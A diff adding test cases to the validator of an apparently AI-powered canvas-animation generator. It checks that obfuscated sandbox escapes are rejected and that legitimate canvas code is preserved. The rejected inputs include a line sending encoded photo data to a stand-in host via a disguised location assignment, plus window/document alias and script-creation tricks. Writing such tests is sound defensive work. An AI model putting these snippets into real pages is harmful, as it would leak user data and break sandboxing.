@@ -23,6 +23,38 @@ describe('animation provider validation', () => {
     expect(() => parseAnimationResponse(response(undefined, 'max_tokens'), 10)).toThrow(/incomplete/i);
   });
   it.each([
+    ['globalThis alias and dynamic navigation', 'const host=globalThis;host["loc"+"ation"]="https://example.invalid/?data="+encodeURIComponent(window.ASSETS.photo);'],
+    ['self alias', 'const host=self;host["loc"+"ation"]="https://example.invalid/";'],
+    ['parent alias', 'const host=parent;host["loc"+"ation"]="https://example.invalid/";'],
+    ['top alias', 'const host=top;host["loc"+"ation"]="https://example.invalid/";'],
+    ['frames alias', 'const host=frames;host["loc"+"ation"]="https://example.invalid/";'],
+    ['window alias', 'const host=window;host["loc"+"ation"]="https://example.invalid/";'],
+    ['document alias', 'const page=document;page["loc"+"ation"]="https://example.invalid/";'],
+    ['global this', 'const host=this;host["loc"+"ation"]="https://example.invalid/";'],
+    ['window returned from a function', 'function getHost(){return window;}'],
+    ['document passed as an argument', 'function usePage(page){}usePage(document);'],
+    ['window destructuring', 'const {name}=window;'],
+    ['document inside an object', 'const data={page:document};'],
+    ['window inside an array', 'const data=[window];'],
+    ['window outside the canvas contract', 'const other=window.name;'],
+    ['document outside the canvas contract', 'const other=document.defaultView;'],
+    ['DOM owner document access', 'const other=document.getElementById("stage").ownerDocument;'],
+    ['script element creation', 'const tag=document.createElement("script");'],
+    ['ambiguous DOM element creation', 'const name=["scr","ipt"].join("");const tag=document.createElement(name);'],
+    ['global top outside an unrelated local binding', 'function draw(){const top=20;return top;}const host=top;'],
+  ])('rejects %s before saving a runnable animation', (_name, attack) => {
+    const unsafe = html.replace('window.DURATION=10;', `${attack}window.DURATION=10;`);
+    expect(() => parseAnimationResponse(response(JSON.stringify({ html: unsafe, storyboard })), 10)).toThrow(/canvas environment/i);
+  });
+  it('preserves direct canvas, image asset and readiness access required by valid generated code', () => {
+    const valid = imageHtml.replace('const photo=new Image();', 'const stage=document.getElementById("stage");const scratch=document.createElement("canvas");const ctx=stage.getContext("2d");const palette={window:"navy",self:"cream"};const photo=new Image();');
+    expect(parseAnimationResponse(response(JSON.stringify({ html: valid, storyboard })), 10).html).toBe(valid);
+  });
+  it('preserves lexical top coordinates used by existing generated animations', () => {
+    const valid = html.replace('window.DURATION=10;', 'function draw(){const top=20;return top+8;}window.DURATION=10;');
+    expect(parseAnimationResponse(response(JSON.stringify({ html: valid, storyboard })), 10).html).toBe(valid);
+  });
+  it.each([
     ['broken JSON', '{"html":"<canvas'],
     ['missing seek', JSON.stringify({ html: html.replace('window.seek', 'window.other'), storyboard })],
     ['missing closing script', JSON.stringify({ html: html.replace('</script>', ''), storyboard })],
